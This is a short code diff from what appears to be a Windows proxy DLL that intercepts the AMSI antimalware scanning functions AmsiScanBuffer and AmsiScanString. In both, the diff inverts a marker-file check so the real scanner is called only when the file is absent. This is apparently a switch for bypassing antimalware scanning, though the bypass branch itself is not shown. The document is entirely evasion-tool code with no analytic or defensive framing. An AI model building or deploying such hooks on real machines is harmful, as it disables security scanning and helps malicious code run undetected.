@@ -50,7 +50,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 
 HRESULT AmsiScanBuffer_Proxy(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result)
 {
-    if (FileExists(opFile)) {
+    if ( !FileExists(opFile) ) {
         AmsiScanBuffer_Type original = (AmsiScanBuffer_Type)GetProcAddress(hModule, "AmsiScanBuffer");
         return original(amsiContext, buffer, length, contentName, amsiSession, result);
     }
@@ -61,7 +61,7 @@ HRESULT AmsiScanBuffer_Proxy(HAMSICONTEXT amsiContext, PVOID buffer, ULONG lengt
 }
 HRESULT AmsiScanString_Proxy(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result)
 {
-    if (FileExists(opFile)) {
+    if ( !FileExists(opFile) ) {
         AmsiScanString_Type original = (AmsiScanString_Type)GetProcAddress(hModule, "AmsiScanString");
         return original(amsiContext, string, contentName, amsiSession, result);
     }
